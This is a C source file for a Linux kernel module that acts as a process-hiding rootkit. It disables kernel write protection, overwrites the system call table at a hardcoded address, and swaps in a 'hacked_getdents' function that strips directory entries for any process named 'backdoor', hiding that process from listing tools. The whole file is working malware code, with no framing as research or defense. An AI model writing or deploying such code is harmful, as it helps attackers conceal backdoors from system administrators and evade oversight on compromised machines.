#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>


static unsigned long **sct;
char psname[10]="backdoor";

char *processname=psname;

struct linux_dirent{
	unsigned long     d_ino;
	unsigned long     d_off;
	unsigned short    d_reclen;
	char    d_name[1];
};

long (*orig_getdents)(unsigned int fd,struct linux_dirent __user *dirp, unsigned int count);

void disable_write_protection(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	write_cr0(cr0);
}

void enable_write_protection(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	write_cr0(cr0);
}

int myatoi(char *str)
{
	int res = 0;
	int mul = 1;
	char *ptr;
	for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
	{
		if (*ptr < '0' || *ptr > '9')
			return (-1);
		res += (*ptr - '0') * mul;
		mul *= 10;
	}
	if(res>0 && res< 9999)
		printk(KERN_INFO "pid=%d,",res);
	printk("\n");
	return (res);
}

struct task_struct *get_task(pid_t pid)
{
	struct task_struct *p = get_current(),*entry=NULL;
	list_for_each_entry(entry,&(p->tasks),tasks)
	{
		if(entry->pid == pid)
		{
			printk("pid found=%d\n",entry->pid);
			return entry;
		}
		else
		{
			//    printk(KERN_INFO "pid=%d not found\n",pid);
		}
	}
	return NULL;
}

static inline char *get_name(struct task_struct *p, char *buf)
{
	int i;
	char *name;
	name = p->comm;
	i = sizeof(p->comm);
	do {
		unsigned char c = *name;
		name++;
		i--;
		*buf = c;
		if (!c)
			break;
		if (c == '\\') {
			buf[1] = c;
			buf += 2;
			continue;
		}
		if (c == '\n')
		{
			buf[0] = '\\';
			buf[1] = 'n';
			buf += 2;
			continue;
		}
		buf++;
	}
	while (i);
	*buf = '\n';
	return buf + 1;
}

int get_process(pid_t pid)
{
	struct task_struct *task = get_task(pid);
	//    char *buffer[64] = {0};
	char buffer[64];
	if (task)
	{
		get_name(task, buffer);
		//    if(pid>0 && pid<9999)
		//    printk(KERN_INFO "task name=%s\n",*buffer);
		if(strstr(buffer,processname))
			return 1;
		else
			return 0;
	}
	else
		return 0;
}

asmlinkage long hacked_getdents(unsigned int fd,struct linux_dirent __user *dirp, unsigned int count)
{
	//added by lsc for process
	long value;
	//    struct inode *dinode;
	unsigned short len = 0;
	unsigned short tlen = 0;
	//    struct linux_dirent *mydir = NULL;
	//end
	value = (*orig_getdents) (fd, dirp, count);
	tlen = value;
	while(tlen > 0)
	{
		len = dirp->d_reclen;
		tlen = tlen - len;
		printk("%s\n",dirp->d_name);

		if(get_process(myatoi(dirp->d_name)) )
		{
			printk("find process\n");
			memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
			value = value - len;
			printk(KERN_INFO "hide successful.\n");
		}
		if(tlen)
			dirp = (struct linux_dirent *) ((char *)dirp + dirp->d_reclen);
	}
	printk(KERN_INFO "finished hacked_getdents.\n");
	return value;
}


static int enter (void)
{
	sct=(void *)0xc15c3060;
	orig_getdents = sct[__NR_getdents];
	disable_write_protection();
	sct[__NR_getdents]=(unsigned long *)&hacked_getdents;
	enable_write_protection();
	return 0;
}
static void go_out(void)
{
	printk(KERN_INFO "Bye, restoring syscalls\n");
	disable_write_protection();
	sct[__NR_getdents]=(unsigned long *)orig_getdents;
	enable_write_protection();
}
module_init(enter);
module_exit(go_out);
